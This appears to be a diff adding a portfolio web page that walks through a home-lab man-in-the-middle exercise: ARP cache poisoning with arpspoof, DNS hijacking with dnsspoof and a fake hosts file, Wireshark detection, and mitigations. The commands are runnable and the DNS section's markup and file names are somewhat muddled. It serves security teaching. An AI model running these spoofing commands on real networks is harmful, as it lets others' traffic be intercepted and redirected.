@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Full MitM Laboratory | Jairo Loria Portfolio</title>
+    <style>
+        :root {
+            --bg-color: #020617;
+            --card-bg: #0f172a;
+            --border-color: #1e293b;
+            --accent-cyan: #22d3ee;
+            --accent-pink: #f472b6;
+            --text-main: #f1f5f9;
+            --text-dim: #94a3b8;
+            --success: #10b981;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.7;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 40px;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        h1 { font-size: 2.5rem; color: var(--accent-cyan); margin-bottom: 10px; }
+        h2 { font-size: 1.8rem; color: var(--accent-cyan); margin-top: 50px; display: flex; align-items: center; }
+        h2::before { content: "> "; color: var(--accent-pink); margin-right: 10px; }
+
+        .lab-badge {
+            background: rgba(34, 211, 238, 0.1);
+            color: var(--accent-cyan);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            border: 1px solid var(--accent-cyan);
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        pre {
+            background: #000;
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            border-left: 4px solid var(--accent-pink);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+        }
+
+        .cmd { color: var(--accent-pink); font-weight: bold; }
+        .comment { color: #64748b; }
+
+        .screenshot-container {
+            margin: 25px 0;
+            background: #000;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .screenshot-container img {
+            width: 100%;
+            display: block;
+            opacity: 0.8;
+            transition: opacity 0.3s;
+        }
+
+        .screenshot-container img:hover { opacity: 1; }
+
+        .caption {
+            padding: 12px;
+            background: var(--border-color);
+            color: var(--text-dim);
+            font-size: 0.85rem;
+            text-align: center;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .mitigation-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .mitigation-list li {
+            padding: 15px;
+            background: rgba(16, 185, 129, 0.05);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+
+        .mitigation-list strong { color: var(--success); }
+
+        footer {
+            text-align: center;
+            padding: 60px 0;
+            color: var(--text-dim);
+            border-top: 1px solid var(--border-color);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <span class="lab-badge">Advanced Network Security Lab</span>
+        <h1>Man-in-the-Middle Operations and analysis</h1>
+        <p>A technical walk-through of ARP Cache Poisoning, DNS Hijacking, and Forensic Analysis.</p>
+    </header>
+
+    <div class="card">
+        <h2>01. Lab Topology & Setup</h2>
+        <p>The environment consists of two virtual machines connected to a custom <strong>VirtualBox NAT Network</strong> with Promiscuous Mode enabled.</p>
+        <div class="grid-3">
+            <div>
+                <strong>Attacker Node:</strong><br>
+                <small>OS: Kali Linux</small><br>
+                <code>IP: 10.0.2.4</code>
+            </div>
+            <div>
+                <strong>Target Node:</strong><br>
+                <small>OS: Windows / Linux Mint</small><br>
+                <code>IP: 10.0.2.15</code>
+            </div>
+            <div>
+                <strong>Virtual Gateway:</strong><br>
+                <small>DHCP Router</small><br>
+                <code>IP: 10.0.2.1</code>
+            </div>
+        </div>
+    </div>
+
+    <section>
+        <h2>02. ARP Spoofing Phase</h2>
+        <p>The objective is to redirect the traffic flow. By sending forged ARP replies, the attacker forces the victim to update its ARP table with the attacker's MAC address for the Gateway IP.</p>
+        <p>Open a terminal in Kali linux and enter the following code</p>
+        <pre><code><span class="comment"># Terminal 1: Poisoning Victim's Cache</span>
+<span class="cmd">sudo arpspoof -i eth0 -t 10.0.2.15 10.0.2.1</span>
+
+<span class="comment"># Terminal 2: Poisoning Gateway's Cache</span>
+<span class="cmd">sudo arpspoof -i eth0 -t 10.0.2.1 10.0.2.15</span></code></pre>
+        
+        <div class="screenshot-container">
+            <img src="./Files/img/lab2img1.png" alt="ARP Spoofing in action">
+            <div class="caption">Figure 1: Concurrent ARP spoofing terminals maintaining the MitM position.</div>
+        <img src="./Files/img/lab2img2.png" alt="ARP Spoofing in action">
+        </div>
+    </section>
+
+    <section>
+        <h2>03. DNS Hijacking Phase</h2>
+        <p>Once the MitM position is established, we intercept DNS queries. The <code>dnsspoof</code> tool monitors for specific domain requests and replies with a spoofed IP before the real DNS server can respond.</p>
+        <p> 1. Create in Desktop a txt file with the DNS and ip in the following order</p>
+        <pre><code><span class="comment"># Configuration file (fake_hosts.txt)</span>
+
+
+<span class="comment"># Execution</span>
+<span class="cmd">nano fake_hosts.txt</span></code>
+<span class="cmd">8.8.8.8 www.google.com</span></code>
+<span class="cmd">8.8.8.8 www.facebook.com</span></code> <span class="comment"># Save with Cntrl+0</span>
+<br>
+<span class="cmd">sudo dnsspoof -i eth0 -f ~/Desktop/fake_hosts.txt</span></code>
+<span class="cmd">sudo dnsspoof -i eth0 -f fakehosts.txt</span></code></pre>
+
+        <div class="screenshot-container">
+            <img src="./Files/img/lab2img3.png" alt="DNS Redirection Evidence">
+            <div class="caption">Figure 3: Creation of txt file with the ips and address.</div>
+        <br>
+            <img src="./Files/img/lab2img4.png" alt="DNS Redirection Evidence">
+            <div class="caption">Figure 4: Redirecting DNS requests to be filtered in the fake_hosts.txt file.</div>
+        </div>
+    </section>
+
+    <section>
+        <h2>04. Forensic Analysis (Wireshark)</h2>
+        <p>Analyzing the captured traffic confirms the attack success through protocol anomalies.</p>
+        <div class="card">
+            <ul>
+                <li><strong>ARP Detection:</strong> Wireshark flags "Duplicate IP address configured" warnings (two MACs for one IP).</li>
+                <li><strong>DNS Analysis:</strong> Identifying the forged "Standard Query Response" originating from the attacker's MAC.</li>
+            </ul>
+        </div>
+        
+        <div class="screenshot-container">
+            <img src="./Files/img/lab2img5.png" alt="Wireshark Capture">
+            <div class="caption">Figure 3: Wireshark capture showing forged DNS packets and ARP conflicts.</div>
+        </div>
+    </section>
+
+    <section class="mitigation-section">
+        <h2>05. Security & Mitigations</h2>
+        <p>To defend against these attacks, we implement the following industry-standard protections:</p>
+        <ul class="mitigation-list">
+            <li><strong>Dynamic ARP Inspection (DAI):</strong> Prevents ARP poisoning by validating ARP packets against a DHCP snooping database on the switch.</li>
+            <li><strong>DNS over HTTPS (DoH):</strong> Encrypts DNS requests, preventing attackers from reading or spoofing the responses.</li>
+            <li><strong>Static Neighbors:</strong> For critical servers, manually binding MAC addresses to IPs via <code>netsh</code> or <code>ip neighbor</code>.</li>
+        </ul>
+    </section>
+
+    <footer>
+        <p>Lab Documentation by <strong>Jairo Loria</strong> | 2026</p>
+        <p><em>Ethical Hacking: Controlled Environment Testing</em></p>
+    </footer>
+</div>
+
+</body>
+</html>
